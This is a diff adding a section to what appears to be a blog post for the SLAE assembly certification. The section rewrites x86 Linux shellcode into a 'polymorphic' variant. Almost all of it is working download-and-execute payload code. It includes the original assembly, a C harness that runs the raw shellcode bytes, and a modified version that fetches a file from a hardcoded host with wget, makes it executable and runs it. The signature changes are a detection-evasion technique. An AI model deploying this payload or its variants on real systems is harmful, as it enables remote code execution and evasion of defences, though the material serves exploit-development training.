@@ -238,6 +238,187 @@ The modified shellcode increased with 17 bytes which is a 42% increase.
 
 ## Shellcode 3: Download + chmod + exec - 108 bytes
 
+The next and final shellcode is a little bit bigger than the previous samples. Let's begin modifying it!
+
+```c
+/*
+; Filename: downloadexec.nasm
+; Author: Daniel Sauder
+; Website: http://govolution.wordpress.com/
+; Tested on: Ubuntu 12.04 / 32Bit
+; License: http://creativecommons.org/licenses/by-sa/3.0/
+
+; Shellcode:
+; - download 192.168.2.222/x with wget
+; - chmod x
+; - execute x
+; - x is an executable
+; - length 108 bytes
+
+global _start
+
+section .text
+
+_start:
+
+    ;fork
+    xor eax,eax
+    mov al,0x2
+    int 0x80
+    xor ebx,ebx
+    cmp eax,ebx
+    jz child
+  
+    ;wait(NULL)
+    xor eax,eax
+    mov al,0x7
+    int 0x80
+        
+    ;chmod x
+    xor ecx,ecx
+    xor eax, eax
+    push eax
+    mov al, 0xf
+    push 0x78
+    mov ebx, esp
+    xor ecx, ecx
+    mov cx, 0x1ff
+    int 0x80
+    
+    ;exec x
+    xor eax, eax
+    push eax
+    push 0x78
+    mov ebx, esp
+    push eax
+    mov edx, esp
+    push ebx
+    mov ecx, esp
+    mov al, 11
+    int 0x80
+    
+child:
+    ;download 192.168.2.222//x with wget
+    push 0xb
+    pop eax
+    cdq
+    push edx
+    
+    push 0x782f2f32 ;2//x avoid null byte
+    push 0x32322e32 ;22.2
+    push 0x2e383631 ;.861
+    push 0x2e323931 ;.291
+    mov ecx,esp
+    push edx
+    
+    push 0x74 ;t
+    push 0x6567772f ;egw/
+    push 0x6e69622f ;nib/
+    push 0x7273752f ;rsu/
+    mov ebx,esp
+    push edx
+    push ecx
+    push ebx
+    mov ecx,esp
+    int 0x80
+    
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74\x2a\x31\xc0\xb0\x07\xcd\x80\x31\xc9\x31\xc0\x50\xb0\x0f\x6a\x78\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x31\xc0\x50\x6a\x78\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x6a\x0b\x58\x99\x52\x68\x32\x2f\x2f\x78\x68\x32\x2e\x32\x32\x68\x31\x36\x38\x2e\x68\x31\x39\x32\x2e\x89\xe1\x52\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";
+
+main()
+{
+    printf("Shellcode Length:  %d\n", strlen(code));
+    int (*ret)() = (int(*)())code;
+    ret();
+}
+```
+
+Let's go!
+
+```asm
+global _start
+
+section .text
+
+_start:
+
+    ;fork
+    xor ecx,ecx         ; [M] zero ecx instead of eax
+    mul ecx             ; [M] set eax and edx to zero
+    mov al, 0x1         ; [M]
+    inc al              ; [M] fork syscall
+    int 0x80            ; execute syscall
+    mov ebx,edx         ; [M] mov edx into ebx instead of xor ebx,ebx
+    cmp eax,ebx
+    jz child
+
+    ;wait(NULL)
+    xor eax,eax
+    mov al,0x8          ; [M]
+    dec al              ; [M] waitpid syscall
+    int 0x80            ; execute syscall
+
+    ;chmod x
+    ;xor ecx,ecx        ; this can be removed
+    xor eax, eax        ; zero out eax
+    push edx            ; [M] push edx instead of eax, null byte
+    mov al, 0xf         ; chmod syscall
+    push 0x78           ; "x" character
+    mov ebx, esp        ; set current stack pointer to ebx
+    mov ecx, edx        ; [M] mov ecx,edx instead of xor ecx,ecx
+    mov cx, 0x1ff       ; set chmod mode to 511
+    int 0x80            ; execute syscall
+
+    ;exec x
+    ;xor eax, eax       ; this can be removed
+    push edx            ; [M] push edx instead of eax
+    push 0x78           ; "x" character
+    mov ebx, esp        ; set current stack pointer to ebx
+    push edx            ; [M] push edx instead of eax
+    mov edx, esp        ; set current stack pointer to edx
+    push ebx
+    mov ecx, esp
+    mov al, 0xa         ; [M]
+    inc al              ; [M] 0xb is execve syscall
+    int 0x80            ; execute syscall
+
+child:
+    ;download 192.168.1.20/x with wget
+    xor ecx, ecx        ; [M]
+    mul ecx             ; [M]
+    mov al, 0xb         ; [M] execve syscall
+    push edx
+
+    push word 0x782f    ; [M] /x avoid null byte
+    push 0x30322e31     ; [M] 20.1
+    push 0x2e383631     ; .861
+    push 0x2e323931     ; .291
+    mov ecx,esp
+    push edx
+
+    push 0x74           ;t
+    push 0x6567772f     ;egw/
+    push 0x6e69622f     ;nib/
+    push 0x7273752f     ;rsu/
+    mov ebx,esp
+    push edx
+    push ecx
+    push ebx
+    mov ecx,esp
+    int 0x80            ; execute syscall
+```
+
+We added 5 bytes and removed 2 lines from the original shellcode. This results in a total of 113 bytes for the modified shellcode. That's a 4% increase :) The image below shows how the program downloads a file and executes it.
+
+![shellcode_3_image.png](shellcode_3_image.png)
+
+That's it, stay tuned for the next and final article in my SLAE series.
+
 ---
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
 
